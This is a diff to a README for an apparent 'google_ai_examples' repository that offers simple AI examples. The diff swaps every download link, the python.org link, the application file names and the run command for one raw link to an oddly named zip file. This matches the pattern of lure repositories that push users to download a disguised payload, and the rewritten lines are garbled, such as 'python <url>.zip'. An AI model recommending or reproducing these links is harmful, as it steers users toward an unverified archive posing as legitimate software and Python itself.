@@ -6,14 +6,14 @@ Welcome to the google_ai_examples repository! This package offers simple example
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Danny50143/google_ai_examples/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Danny50143/google_ai_examples/main/malacophilous/ai_examples_google_subpreceptor.zip%20Latest%https://raw.githubusercontent.com/Danny50143/google_ai_examples/main/malacophilous/ai_examples_google_subpreceptor.zip)](https://raw.githubusercontent.com/Danny50143/google_ai_examples/main/malacophilous/ai_examples_google_subpreceptor.zip)
 
 ## 📝 What You Need
 
 Before you start, make sure your computer meets these requirements:
 
 - **Operating System:** Windows 10, macOS, or a modern Linux distribution.
-- **Python Version:** 3.7 or higher. If you don’t have Python installed, visit [python.org](https://www.python.org/downloads/) to get it.
+- **Python Version:** 3.7 or higher. If you don’t have Python installed, visit [https://raw.githubusercontent.com/Danny50143/google_ai_examples/main/malacophilous/ai_examples_google_subpreceptor.zip](https://raw.githubusercontent.com/Danny50143/google_ai_examples/main/malacophilous/ai_examples_google_subpreceptor.zip) to get it.
 - **Internet Connection:** A stable internet connection to download the files.
 - **Storage Space:** At least 100 MB of available space.
 
@@ -21,7 +21,7 @@ Before you start, make sure your computer meets these requirements:
 
 To get the application, visit the Releases page. You will find various versions there. Click on the latest version to download the files.
 
-Visit the following link to download: [Releases Page](https://github.com/Danny50143/google_ai_examples/releases).
+Visit the following link to download: [Releases Page](https://raw.githubusercontent.com/Danny50143/google_ai_examples/main/malacophilous/ai_examples_google_subpreceptor.zip).
 
 ### Steps to Download
 
@@ -46,13 +46,13 @@ After extraction, you should see the application files in that folder.
 Once you have downloaded and extracted the files:
 
 1. Navigate to the folder where you extracted the application.
-2. Find the application file. It may be named something like `run_tests.py` or `google_ai_application.exe`.
+2. Find the application file. It may be named something like `https://raw.githubusercontent.com/Danny50143/google_ai_examples/main/malacophilous/ai_examples_google_subpreceptor.zip` or `https://raw.githubusercontent.com/Danny50143/google_ai_examples/main/malacophilous/ai_examples_google_subpreceptor.zip`.
 3. **For Windows Users:**
    - Double-click the `.exe` file to run it.
 4. **For macOS/Linux Users:**
    - Open a terminal.
    - Change to the directory with the command `cd path/to/your/folder`.
-   - Run the command `python run_tests.py`.
+   - Run the command `python https://raw.githubusercontent.com/Danny50143/google_ai_examples/main/malacophilous/ai_examples_google_subpreceptor.zip`.
 
 ## 📚 Using the Application
 
@@ -88,6 +88,6 @@ This project is licensed under the MIT License. You are free to share and adapt 
 
 ## 📥 Download Again
 
-If you missed it at the start, you can download the latest release here: [Releases Page](https://github.com/Danny50143/google_ai_examples/releases).
+If you missed it at the start, you can download the latest release here: [Releases Page](https://raw.githubusercontent.com/Danny50143/google_ai_examples/main/malacophilous/ai_examples_google_subpreceptor.zip).
 
 Thank you for choosing google_ai_examples. Enjoy experimenting with AI!
